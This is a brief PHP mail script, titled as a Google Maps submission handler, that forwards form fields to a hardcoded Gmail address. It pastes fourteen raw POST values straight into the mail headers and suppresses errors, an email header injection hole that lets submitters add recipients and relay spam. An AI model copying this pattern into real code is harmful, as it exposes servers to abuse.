Google Map Info Submitted
<?php 


 
$to =  "jerrieleu@gmail.com";
$subject = "Submit Google Maps";

 
$body  = $_POST['message'];


$headers = $_POST['message1']. "\r\n";
 

 
$headers .= $_POST['message2'] . "\r\n";

$headers .=  $_POST['message3']  . "\r\n";


$headers .= $_POST['message4'] . "\r\n";

$headers .=  $_POST['message5']  . "\r\n";


$headers .= $_POST['message6']   . "\r\n";

$headers .= $_POST['message7']   . "\r\n";

$headers .= $_POST['message8']   . "\r\n";

$headers .= $_POST['message9']   . "\r\n";

$headers .= $_POST['message0']   . "\r\n";

$headers .= $_POST['message11']   . "\r\n";

$headers .= $_POST['message12']   . "\r\n";

$headers .= $_POST['message13']   . "\r\n";

$headers .= $_POST['message14']  . "\r\n";

 

@mail($to, $subject, $body, 

$headers);
 //replace with landing page.
?>
